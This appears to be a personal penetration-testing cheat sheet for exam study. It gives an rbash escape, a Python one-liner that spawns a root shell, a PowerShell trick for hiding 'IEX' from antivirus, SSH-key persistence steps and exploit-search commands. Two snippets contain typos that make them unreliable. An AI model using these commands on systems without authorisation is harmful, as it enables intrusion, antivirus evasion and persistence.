# Useful Commands
This is just a collection of useful code snippets that can come in handy, in no particular order (mainly for my own use for the exam)

---

## Table of Contents
- [rbash Escape](#rbash%20escape)
- [Python root shell](#python%20spawn%20root%20shell)
- [IEX AV Evasion](#iex%20av%20evasion%20technique)

---

## rbash Escape
The easiest rbash escape (if you can SSH): 
```bash
ssh user@box -t "bash --noprofile"
```

---

## Python spawn root shell
Create a root bash prompt:
```bash
python -c 'import os,pty;os.setuid(0);os.setgit(0);pty.spawn("/bin/bash");'
```
(try Python3 if python doesn't work)

---

## "IEX" AV evasion technique

The following code snippet will generate the "IEX" string without explicitly writing it (which may help against overzealous AV software).

```powershell
$env:comspec[4,15,25] -join
```

It can then be used this way:

```powershell
'(CODE TO EXECUTE HERE)' | &($env[comspec[4,15,25] -Join '')
```

---

## Random Commands

Searchsploit
```
searchsploit -x <path>  # View exploit code
searchsploit -m <path>  # Copy exploit to working directory
```

Generate an SSH-key
1. Generat the key with: `ssh-keygen -f <boxname>`
2. Copy the public into authorized_keys
3. `chmod 600 .ssh/authorized_keys`
4. `chmod 600 <boxname>`
5. `ssh -i <boxname> <user>@<target_ip>`

Run-As in Powershell
`powershell -Command "Start-Process cmd -Verb RunAs"`

Generate Wordlists with `Cewl` for sites

---

## Cheatsheets and useful vids

TJ Null's OSCP-like list: https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159

Random vulns and stuff: https://medium.com/oscp-cheatsheet/oscp-cheatsheet-6c80b9fa8d7e

IppSec's video search page: https://ippsec.rocks/

PortSwigger's SQLi Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

LFI Cheat Sheet: https://highon.coffee/blog/lfi-cheat-sheet/
